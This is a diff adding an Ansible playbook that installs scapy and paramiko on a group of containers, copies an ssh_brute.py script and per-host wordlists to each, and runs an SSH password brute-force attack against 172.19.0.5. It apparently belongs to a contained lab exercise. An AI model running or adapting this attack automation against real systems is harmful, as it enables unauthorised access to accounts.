@@ -1,0 +1,37 @@
+---
+
+- name: ssh brute force attack
+  hosts: containers
+  remote_user: docker
+  become: yes
+
+  tasks:
+  - name: apt-get update
+    apt:
+            update_cache: yes
+
+  - name: install pip3
+    apt:
+            name: python3-pip    
+
+  - name: install scapy
+    command: pip3 install scapy
+
+  - name: install paramiko
+    command: pip3 install paramiko
+
+  - name: copy ssh_brute.py to remote users
+    copy:
+            src: /project/tools/ssh_brute.py
+            dest: /tmp/ssh_brute.py
+            owner: docker
+
+  - name: copy appropriate wordlist for each remote user
+    copy: src=/project/wordlists/{{ ansible_eth0.ipv4.address }} dest=/tmp/wordlist
+
+  - name: run ssh_brute.py and return result through custom fact password.fact
+    shell: python3 /tmp/ssh_brute.py -t 172.19.0.5 -f /tmp/wordlist
+    register: result
+
+  - debug:
+          msg: "Somebody found it: {{ result }}"
